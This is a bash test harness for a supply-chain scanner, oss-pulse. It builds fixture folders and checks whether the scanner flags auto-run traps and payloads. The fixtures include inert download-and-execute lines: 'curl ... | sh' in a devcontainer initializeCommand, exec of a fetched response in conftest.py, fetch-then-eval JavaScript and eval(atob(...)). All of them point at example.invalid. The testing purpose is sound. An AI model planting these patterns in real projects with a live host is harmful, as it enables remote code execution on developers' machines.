#!/usr/bin/env bash
# Scripted customer tasks for oss-pulse: one PASS or FAIL row per thing a customer tries.
#
# usage: bash scripts/cx_tasks.sh SOURCE [WORKDIR]
#
# SOURCE is an oss-pulse source tree: this checkout, or a git worktree of an older commit.
# It is installed fresh and non-editable into WORKDIR/venv, the way action.yml installs it,
# so the rows describe what a customer gets rather than a developer's editable tree. SOURCE
# is only read. Every fixture is written under WORKDIR and is inert: tasks run echo, every
# URL is on example.invalid (which never resolves), and oss-pulse only reads the files.
# T02 (pip) and T04 (check) need pypi.org and files.pythonhosted.org; nothing else uses the
# network, and nothing gets a GitHub token. PYTHON picks the interpreter (default python3).
#
# Output is TSV: a header with the commit, date, OS, Python and the SHA-256 of this file,
# a column line, one row per task, then "# passed N of 32". Raw output stays in WORKDIR.
#
# Comparing runs:
#   - Two runs are comparable only when their tasks_sha256 match.
#   - Never change a criterion in the change that makes its task pass. A wrong criterion
#     gets its own commit, a new hash and new baselines, with the reason written here.
#   - Report the failing rows with the number.
#
# Baselines are in docs/research/cx-tasks/. T14 to T30 failed at 2410415 and at 34bdad4.
# T31 and T32 are guardrails: they passed at 34bdad4 and have to keep passing.
#
# Changed from the 13-task version (docs/research/cx-tasks/original/):
#   T01 took the first line starting 'pip install'. It now takes the first pip, pipx or uv
#       install command and also runs it through bash -n, so a README that switches
#       installers is still checked rather than passed or failed by accident.
#   T04 grepped for the report's heading. The brand guide drops headings that name a
#       genre, so a working check would have failed over a copy change. It now needs exit
#       0, no traceback, and a --json file that lists at least one dependency.
#   T11 wanted the word 'scanned' and a caveat such as 'not safe'. The brand's words are
#       'read' and "clear isn't an audit", and it never calls a target safe. It now wants a
#       file count and that caveat.
#   T13 passed for any file under docs/ that used two words, privacy and pypi.org, and the
#       research report written with this version does. It now needs one file, README.md
#       or a doc outside docs/research/, that mentions privacy and names every host check
#       contacts. At 2410415 and 34bdad4 both versions of T13 fail.
set -u
PY=${PYTHON:-python3}
SCRIPT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/$(basename "${BASH_SOURCE[0]}")"
SRC=$(cd "${1:?usage: cx_tasks.sh SOURCE [WORKDIR]}" && pwd) || exit 2
WORK=${2:-$(mktemp -d)}
mkdir -p "$WORK" && WORK=$(cd "$WORK" && pwd) && cd "$WORK" || exit 2

sha256() { if command -v sha256sum > /dev/null; then sha256sum "$1"; else shasum -a 256 "$1"; fi | cut -d' ' -f1; }
COMMIT=$(git -C "$SRC" rev-parse --short HEAD 2> /dev/null || echo unknown)
if git -C "$SRC" status --porcelain 2> /dev/null | grep -q .; then COMMIT="$COMMIT+dirty"; fi
PYVER=$("$PY" -I -c 'import platform; print(platform.python_version())')
TASKS_SHA=$(sha256 "$SCRIPT")

if command -v timeout > /dev/null; then limit() { timeout "$@"; }; else limit() { shift; "$@"; }; fi
OSS="$WORK/venv/bin/oss-pulse"
run() { local secs=$1; shift; limit "$secs" env -u GITHUB_TOKEN -u GH_TOKEN "$@"; }
op() { run 300 "$OSS" "$@"; }
# On a pseudo-terminal, as a person at a shell would run it.
in_pty() { limit 300 "$PY" -I -c 'import os, pty, sys; sys.exit(os.waitstatus_to_exitcode(pty.spawn(sys.argv[1:])))' "$@" < /dev/null; }
now() { "$PY" -I -c 'import time; print(f"{time.time():.3f}")'; }
# A file's text without terminal escape sequences (a pseudo-terminal gets coloured output).
plain() { LC_ALL=C sed $'s/\x1b\\[[0-9;?]*[ -/]*[@-~]//g' "$1"; }
crashed() { local f; for f in "$@"; do plain "$f" | grep -q Traceback && return 0; done; return 1; }
# A --json report that parses and lists at least one dependency.
has_dependency() {
  "$PY" -I -c 'import json, sys
d = json.load(open(sys.argv[1], encoding="utf-8"))
deps = d.get("dependencies") if isinstance(d, dict) else None
sys.exit(0 if isinstance(deps, list) and deps else 1)' "$1" 2> /dev/null
}
# Evidence: the exception line of a crash, otherwise the first line matching the pattern.
first_line() {
  if crashed "$1"; then plain "$1" | grep -E '^[A-Za-z]+(Error|Exception)([^A-Za-z]|$)' | tail -1
  else plain "$1" | grep -v '^[[:space:]]*$' | grep -m1 -E "$2"; fi
}
# One TSV cell: no escape sequences, control characters, tabs or panel borders, at most
# 140 characters.
cell() {
  "$PY" -I -c 'import re, sys
s = sys.stdin.buffer.read().decode("utf-8", "replace")
s = re.sub(r"\x1b\[[0-9;?]*[ -/]*[@-~]|[\U00002500-\U0000257F]", " ", s)
sys.stdout.write(" ".join("".join(c if c.isprintable() else " " for c in s).split())[:140])'
}
pass=0; total=0
row() {
  total=$((total + 1)); [ "$2" = PASS ] && pass=$((pass + 1))
  printf '%s\t%s\t%s\t%s\n' "$1" "$2" "$3" "$(printf '%s' "$4" | cell)"
}

# ---- inert fixtures ------------------------------------------------------------------
ON_OPEN='{"version":"2.0.0","tasks":[{"label":"setup","type":"shell","command":"echo hi","runOptions":{"runOn":"folderOpen"}}]}'
plant() { mkdir -p "$1/.vscode" && printf '%s\n' "$ON_OPEN" > "$1/.vscode/tasks.json"; }
rm -rf fx && mkdir -p fx/clean fx/typo fx/empty
printf 'print("hello")\n' > fx/clean/main.py
printf 'requests>=2.31\n' > fx/clean/requirements.txt
plant fx/trap
plant fx/trap-ignored
printf '*\n' > fx/trap-ignored/.osspulseignore          # planted by the folder's author
printf 'requets==1.0\n' > fx/typo/requirements.txt      # one letter off 'requests'
: > fx/empty/requirements.txt

plant fx/wrapper/take-home                              # T14: one folder down, as unzipped
mkdir -p fx/workspace fx/mixed-tasks/.vscode
printf '%s\n' '{"folders":[{"path":"."}],"tasks":{"version":"2.0.0","tasks":[{"label":"setup","type":"shell","command":"echo hi","runOptions":{"runOn":"folderOpen"}}]}}' > fx/workspace/dex.code-workspace
printf '%s\n' '{"version":"2.0.0","tasks":["x",{"label":"setup","type":"shell","command":"echo hi","runOptions":{"runOn":"folderOpen"}}]}' > fx/mixed-tasks/.vscode/tasks.json
plant fx/odd-workflow && mkdir -p fx/odd-workflow/.github/workflows
printf 'on: [{}]\njobs: {}\n' > fx/odd-workflow/.github/workflows/ci.yml
mkdir -p fx/lock fx/conftest fx/vendored/node_modules/x fx/loader fx/devcontainer/.devcontainer
printf 'version = 1\nrequires-python = ">=3.11"\n' > fx/lock/uv.lock
printf 'import requests\n\nexec(requests.get("https://example.invalid/a").text)\n' > fx/conftest/conftest.py
printf "eval(atob('eA=='))\n" > fx/vendored/node_modules/x/index.js     # 'eA==' is "x"
printf '%s\n' 'const axios = require("axios");' 'const u = "https://example.invalid/a";' \
  'axios.get(u).then(r => eval(r.data));' > fx/loader/index.js
printf '%s\n' '{"name":"dev","initializeCommand":"curl -s https://example.invalid/a | sh"}' \
  > fx/devcontainer/.devcontainer/devcontainer.json
mkdir -p fx/legit-take-home/.husky fx/legit-take-home/src
cat > fx/legit-take-home/package.json << 'EOF'
{
  "name": "take-home",
  "version": "1.0.0",
  "private": true,
  "scripts": {
    "prepare": "husky",
    "build": "tsc",
    "test": "jest"
  },
  "devDependencies": {
    "husky": "^9.1.6",
    "jest": "^29.7.0",
    "lint-staged": "^15.2.10",
    "prettier": "^3.3.3",
    "typescript": "^5.6.3"
  },
  "lint-staged": {
    "*.ts": "prettier --write"
  }
}
EOF
printf 'npx lint-staged\n' > fx/legit-take-home/.husky/pre-commit
printf 'export function add(a: number, b: number): number {\n  return a + b;\n}\n' > fx/legit-take-home/src/index.ts
"$PY" -I - << 'EOF'
import json
import zipfile
from pathlib import Path

# T16: pretty-printed like a real tasks.json, with the O of folderOpen written as a JSON
# escape (chr(92) is a backslash) and a URL whose // a naive comment stripper cuts at.
Path("fx/escaped/.vscode").mkdir(parents=True)
task = {"label": "setup", "type": "shell", "command": "echo https://example.invalid/a"}
task["runOptions"] = {"runOn": "folderOpen"}
doc = json.dumps({"version": "2.0.0", "tasks": [task]}, indent=2) + "\n"
Path("fx/escaped/.vscode/tasks.json").write_text(doc.replace("folderOpen", "folder" + chr(92) + "u004fpen"))

# T24: a bundle over 2 MB whose first line decodes a string and runs it.
Path("fx/bundle").mkdir()
Path("fx/bundle/bundle.js").write_text("eval(atob('eA=='))\n" + "x" * 2_100_000 + "\n")

# T28: the trap zipped with a top folder, as a recruiter would send it.
with zipfile.ZipFile("fx/trap.zip", "w") as z:
    entry = zipfile.ZipInfo("trap/.vscode/tasks.json", (2026, 11, 1, 0, 0, 0))
    z.writestr(entry, Path("fx/trap/.vscode/tasks.json").read_bytes())

# T32: 8,000 strings that look like curl | sh, about 390 KB.
Path("fx/decoys").mkdir()
lines = "".join(f"x{i} = 'curl https://example.invalid/{i} | sh'\n" for i in range(1, 8001))
Path("fx/decoys/decoys.py").write_text("import os\n" + lines)
EOF

printf '# oss-pulse scripted customer tasks\tcommit=%s\tdate=%s\tos=%s\tpython=%s\ttasks_sha256=%s\n' \
  "$COMMIT" "$(date -u +%FT%TZ)" "$(uname -srm)" "$PYVER" "$TASKS_SHA"
printf 'task\tresult\tmeasure\tevidence\n'

# T01 The README's install command can be pasted into a shell as it is
line=$(grep -m1 -E '^[[:space:]]*((python3? -m )?pip3?|pipx|uv (pip|tool)) install([[:space:]]|$)' "$SRC/README.md" || true)
if [ -n "$line" ] && ! grep -q '[<>]' <<< "$line" && bash -n <<< "$line" 2> /dev/null; then r=PASS; else r=FAIL; fi
row T01-readme-install-copy-pastes "$r" "-" "${line:-no pip, pipx or uv install command in README.md}"

# T02 Fresh install succeeds (time, package count, size)
rm -rf venv && "$PY" -m venv venv
t0=$(date +%s); venv/bin/pip install --quiet "$SRC" > pip.log 2>&1; rc=$?; t1=$(date +%s)
n=$(venv/bin/pip list 2> /dev/null | tail -n +3 | wc -l); mb=$(du -sm venv | cut -f1)
[ $rc -eq 0 ] && r=PASS || r=FAIL
row T02-fresh-install "$r" "$((t1 - t0))s, $n packages, $mb MB" "pip rc=$rc"

# T03 Fresh install: scan a clean folder
op scan fx/clean > t03.out 2>&1; rc=$?
if [ $rc -eq 0 ] && ! crashed t03.out; then r=PASS; else r=FAIL; fi
row T03-fresh-scan-clean-folder "$r" "rc=$rc" "$(first_line t03.out 'Error|findings|clear')"

# T04 Fresh install: check a benign requirements file (needs pypi.org)
t0=$(date +%s); op check fx/clean/requirements.txt --data-dir "$WORK/lake" --json "$WORK/t04.json" > t04.out 2> t04.err; rc=$?; t1=$(date +%s)
if [ $rc -eq 0 ] && ! crashed t04.out t04.err && has_dependency t04.json; then r=PASS; else r=FAIL; fi
if crashed t04.err; then ev=$(first_line t04.err .); else ev=$(first_line t04.out 'dependenc|rror'); fi
row T04-fresh-check-benign-deps "$r" "rc=$rc, $((t1 - t0))s" "$ev"

# T05 Scan flags a folder that auto-runs a task on open, and fails the gate
op scan fx/trap --fail-on high > t05.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -q AUTO-VSCODE t05.out; then r=PASS; else r=FAIL; fi
row T05-scan-detects-auto-run "$r" "rc=$rc" "$(first_line t05.out 'AUTO-VSCODE|Error|findings')"

# T06 An ignore file planted inside the untrusted folder cannot hide that finding
op scan fx/trap-ignored --fail-on high > t06.out 2>&1; rc=$?
if grep -q AUTO-VSCODE t06.out; then r=PASS; else r=FAIL; fi
row T06-planted-ignore-cannot-hide "$r" "rc=$rc" "$(first_line t06.out 'AUTO-VSCODE|suppress|Error|findings')"

# T07 A typosquat finding names the offending dependency and its line
op scan fx/typo > t07.out 2>&1; rc=$?
if grep -q 'requets' t07.out && grep -q 'requirements.txt:1' t07.out; then r=PASS; else r=FAIL; fi
row T07-typo-finding-names-name-and-line "$r" "rc=$rc" "$(first_line t07.out 'TYPO|Error|findings')"

# T08 The installed version is discoverable (for bug reports and upgrades)
op --version > t08.out 2>&1; rc=$?
[ $rc -eq 0 ] && r=PASS || r=FAIL
row T08-version-flag "$r" "rc=$rc" "$(first_line t08.out '.')"

# T09 The report itself says where to report a wrong result
if grep -Eqi 'https?://[^ )]*(issues|discussions)' t05.out; then r=PASS; else r=FAIL; fi
row T09-report-has-feedback-link "$r" "-" "$(first_line t05.out 'https?://|<sub>')"

# T10 A user error gets a plain message and an exit code that is not 'risk found' (1)
op check fx/empty/requirements.txt > t10.out 2>&1; rc=$?
if [ $rc -ne 0 ] && [ $rc -ne 1 ] && ! crashed t10.out; then r=PASS; else r=FAIL; fi
row T10-user-error-not-risk-exit "$r" "rc=$rc" "$(first_line t10.out 'Error|error')"

# T11 A clean scan report says how much it read and that clear is not an audit
flat=$(tr -s '[:space:]' ' ' < t03.out)                # a wrapped line still matches
if ! crashed t03.out && grep -Eq '[0-9]+ files?' <<< "$flat" \
  && grep -Eqi "no known|not a guarantee|isn.t an audit|not an audit" <<< "$flat"; then r=PASS; else r=FAIL; fi
row T11-clean-report-coverage-and-caveat "$r" "-" "$(first_line t03.out 'files? read|findings|clear|Error')"

# T12 Help, security, change and feedback paths exist
missing=""
for f in SECURITY.md SUPPORT.md CHANGELOG.md CONTRIBUTING.md .github/ISSUE_TEMPLATE; do
  [ -e "$SRC/$f" ] || missing="$missing $f"
done
[ -z "$missing" ] && r=PASS || r=FAIL
row T12-help-security-changelog-feedback "$r" "-" "missing:${missing:- none}"

# T13 A privacy / data-flow statement names the hosts contacted
found=$(
  { [ -f "$SRC/README.md" ] && echo "$SRC/README.md"; find "$SRC/docs" -name '*.md' -not -path '*/docs/research/*' 2> /dev/null; } \
    | while IFS= read -r f; do
      grep -qi privacy "$f" || continue
      for h in pypi.org api.osv.dev api.github.com api.securityscorecards.dev; do grep -qF "$h" "$f" || continue 2; done
      printf '%s ' "${f#"$SRC"/}"
    done
)
if [ -n "$found" ]; then r=PASS; ev="in: $found"; else r=FAIL; ev=$(ls "$SRC"/docs 2> /dev/null | tr '\n' ' '); fi
row T13-privacy-statement "$r" "-" "$ev"

# T14 A trap one folder down, the way an unzipped download leaves it, is still caught
op scan fx/wrapper --fail-on high > t14.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -q AUTO-VSCODE t14.out && ! crashed t14.out; then r=PASS; else r=FAIL; fi
row T14-nested-folder-trap "$r" "rc=$rc" "$(first_line t14.out 'AUTO-VSCODE|Error|findings|hold|clear')"

# T15 A folderOpen task in a .code-workspace file is caught
op scan fx/workspace --fail-on high > t15.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -Eq 'AUTO-(VSCODE|WORKSPACE)' t15.out && grep -q 'dex.code-workspace' t15.out \
  && ! crashed t15.out; then r=PASS; else r=FAIL; fi
row T15-code-workspace-trap "$r" "rc=$rc" "$(first_line t15.out 'AUTO-|Error|findings|hold|clear')"

# T16 runOn spelled with a JSON escape, next to a URL, is still caught, and the URL is quoted
op scan fx/escaped --fail-on high > t16.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -q AUTO-VSCODE t16.out && grep -q 'https://example.invalid/a' t16.out \
  && ! crashed t16.out; then r=PASS; else r=FAIL; fi
row T16-escaped-folderopen-trap "$r" "rc=$rc" "$(first_line t16.out 'AUTO-VSCODE|Error|findings|hold|clear')"

# T17 A tasks list that starts with a stray string still has its folderOpen task reported
op scan fx/mixed-tasks --fail-on high > t17.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -q AUTO-VSCODE t17.out && ! crashed t17.out; then r=PASS; else r=FAIL; fi
row T17-odd-tasks-list-trap "$r" "rc=$rc" "$(first_line t17.out 'AUTO-VSCODE|Error|findings|hold|clear')"

# T18 A workflow with an odd 'on:' doesn't stop the scan from reporting the trap beside it
op scan fx/odd-workflow --fail-on high > t18.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -q AUTO-VSCODE t18.out && ! crashed t18.out; then r=PASS; else r=FAIL; fi
row T18-odd-workflow-next-to-trap "$r" "rc=$rc" "$(first_line t18.out 'AUTO-VSCODE|Error|findings|hold|clear')"

# T19 With no options, scan exits 1 on a folder that runs code when it is opened
op scan fx/trap > t19.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -q AUTO-VSCODE t19.out && ! crashed t19.out; then r=PASS; else r=FAIL; fi
row T19-default-gate-stops-trap "$r" "rc=$rc" "$(first_line t19.out 'AUTO-VSCODE|Error|findings|hold|clear')"

# T20 Output redirected under the Windows code page (cp1252) still prints the report
run 300 env PYTHONIOENCODING=cp1252 "$OSS" scan fx/trap --fail-on high > t20.out 2> t20.err; rc=$?
if [ $rc -eq 1 ] && grep -q AUTO-VSCODE t20.out && ! grep -q UnicodeEncodeError t20.out t20.err \
  && ! crashed t20.out t20.err; then r=PASS; else r=FAIL; fi
cat t20.out t20.err > t20.all
row T20-cp1252-redirect "$r" "rc=$rc" "$(first_line t20.all 'AUTO-VSCODE|Error|findings|hold')"

# T21 A lockfile gets a plain error and exit 2, not a traceback
op check fx/lock/uv.lock > t21.out 2>&1; rc=$?
if [ $rc -eq 2 ] && grep -q 'uv.lock' t21.out && ! crashed t21.out; then r=PASS; else r=FAIL; fi
row T21-lockfile-plain-error "$r" "rc=$rc" "$(first_line t21.out 'uv.lock|Error|error')"

# T22 -v after the command is accepted, and the exit code still reflects the trap
op scan fx/trap --fail-on high -v > t22.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -q AUTO-VSCODE t22.out && ! crashed t22.out; then r=PASS; else r=FAIL; fi
row T22-verbose-after-command "$r" "rc=$rc" "$(first_line t22.out 'AUTO-VSCODE|No such|rror:|findings|hold')"

# T23 A conftest.py that downloads code and runs it is caught (pytest imports it on every run)
op scan fx/conftest --fail-on high > t23.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -q CODE-DLEXEC t23.out && ! crashed t23.out; then r=PASS; else r=FAIL; fi
row T23-conftest-download-exec "$r" "rc=$rc" "$(first_line t23.out 'CODE-|Error|findings|hold|clear')"

# T24 A payload on line 1 of a bundle over 2 MB is caught
op scan fx/bundle --fail-on high > t24.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -q CODE-JSOBF t24.out && ! crashed t24.out; then r=PASS; else r=FAIL; fi
row T24-big-bundle-payload "$r" "rc=$rc" "$(first_line t24.out 'CODE-|Error|findings|hold|clear')"

# T25 A payload in a committed node_modules/ is caught, and the report names the file
op scan fx/vendored --fail-on high > t25.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -q CODE-JSOBF t25.out && grep -q 'node_modules/x/index.js' t25.out \
  && ! crashed t25.out; then r=PASS; else r=FAIL; fi
row T25-node-modules-payload "$r" "rc=$rc" "$(first_line t25.out 'CODE-|Error|findings|hold|clear')"

# T26 On a terminal, scan prints terminal text: no Markdown table, HTML or comment marker
in_pty env -u GITHUB_TOKEN -u GH_TOKEN TERM=xterm-256color COLUMNS=80 "$OSS" scan fx/trap > t26.out 2>&1; rc=$?
plain t26.out > t26.txt
if grep -q AUTO-VSCODE t26.txt && ! crashed t26.txt && ! grep -Eq '<!--|<sub>|\|---\|' t26.txt; then r=PASS; else r=FAIL; fi
row T26-terminal-output-not-markdown "$r" "rc=$rc" "$(first_line t26.out '.')"

# T27 'oss-pulse rules RULE' explains one rule
op rules AUTO-VSCODE > t27.out 2>&1; rc=$?
if [ $rc -eq 0 ] && grep -q folderOpen t27.out && ! crashed t27.out; then r=PASS; else r=FAIL; fi
row T27-rules-explains-one-rule "$r" "rc=$rc" "$(first_line t27.out 'AUTO-VSCODE|unexpected|rror:')"

# T28 scan reads the .zip a recruiter sent, without unzipping it first
op scan fx/trap.zip --fail-on high > t28.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -q AUTO-VSCODE t28.out && ! crashed t28.out; then r=PASS; else r=FAIL; fi
row T28-zip-trap "$r" "rc=$rc" "$(first_line t28.out 'AUTO-VSCODE|Invalid|rror:|findings|hold')"

# T29 JavaScript that fetches a script and evals the response is caught
op scan fx/loader --fail-on high > t29.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -q CODE-DLEXEC t29.out && ! crashed t29.out; then r=PASS; else r=FAIL; fi
row T29-fetch-then-eval "$r" "rc=$rc" "$(first_line t29.out 'CODE-|Error|findings|hold|clear')"

# T30 A dev container whose initializeCommand pipes a download into sh is caught as auto-run
op scan fx/devcontainer --fail-on high > t30.out 2>&1; rc=$?
if [ $rc -eq 1 ] && grep -q AUTO-DEVCONTAINER t30.out && ! crashed t30.out; then r=PASS; else r=FAIL; fi
row T30-devcontainer-initialize-command "$r" "rc=$rc" "$(first_line t30.out 'AUTO-|CODE-|Error|findings|hold')"

# T31 Guardrail: an ordinary husky and TypeScript take-home passes the default gate
op scan fx/legit-take-home > t31.out 2>&1; rc=$?
if [ $rc -eq 0 ] && ! grep -Eq '^[[:space:]]*hold([[:space:]]|$)' t31.out && ! crashed t31.out; then r=PASS; else r=FAIL; fi
row T31-guardrail-legit-take-home "$r" "rc=$rc" "$(first_line t31.out 'Error|findings|hold|review|clear')"

# T32 Guardrail: 8,000 decoy strings scan in under 10 s (stopped at 60 s)
t0=$(now); run 60 "$OSS" scan fx/decoys > t32.out 2>&1; rc=$?; t1=$(now)
secs=$(awk -v a="$t0" -v b="$t1" 'BEGIN { printf "%.2f", b - a }')
if { [ $rc -eq 0 ] || [ $rc -eq 1 ]; } && awk -v s="$secs" 'BEGIN { exit !(s < 10) }' \
  && ! crashed t32.out; then r=PASS; else r=FAIL; fi
row T32-guardrail-decoys-scan-fast "$r" "rc=$rc, ${secs}s" "$(first_line t32.out 'Error|findings|hold|clear')"

printf '# passed %d of %d\n' "$pass" "$total"
